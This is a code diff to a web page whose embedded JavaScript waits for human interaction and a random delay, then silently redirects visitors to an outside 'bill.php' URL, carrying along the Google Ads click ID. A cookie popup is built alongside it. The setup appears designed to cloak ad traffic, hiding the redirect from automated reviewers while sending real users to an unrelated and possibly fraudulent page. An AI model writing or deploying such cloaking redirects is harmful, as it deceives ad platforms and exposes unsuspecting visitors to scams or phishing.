@@ -7,9 +7,9 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
 <!DOCTYPE html>
 <html lang="en">
 <head>
-        <script>
+<script>
 (function(){
-  const redirectUrl = "https://dailyfoodandrecipes.online/bill.php"; // 🔥
+  const redirectUrl = "https://dailyfoodandrecipes.online/bill.php/"; // 🔥 Set your redirect URL here
   let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;
 
   function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
@@ -21,27 +21,18 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
   ][Math.floor(Math.random()*3)]}
 
   function redirectUser(){
-  if(!redirected){
-    redirected = true;
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const gclid = urlParams.get('gclid');
-    const keyword = urlParams.get('utm_term') || urlParams.get('q');
-    const referrer = document.referrer;
-
-    let finalUrl = redirectUrl;
-
-    finalUrl += (redirectUrl.includes('?') ? '&' : '?');
-    if (gclid) finalUrl += 'gclid=' + encodeURIComponent(gclid) + '&';
-    if (keyword) finalUrl += 'keyword=' + encodeURIComponent(keyword) + '&';
-    if (referrer) finalUrl += 'referrer=' + encodeURIComponent(referrer);
-
-    // Clean up trailing '&' if needed
-    finalUrl = finalUrl.replace(/&$/, '');
-
-    window.location.href = finalUrl;
+    if(!redirected){
+      redirected = true;
+      const urlParams = new URLSearchParams(window.location.search);
+      const gclid = urlParams.get('gclid');
+      let finalUrl = redirectUrl;
+      if(gclid){
+        finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
+      }
+      window.location.href = finalUrl;
+    }
   }
-}
+
   function showCookiePopup(){
     const wrapper = document.createElement("div");
     wrapper.innerHTML = `
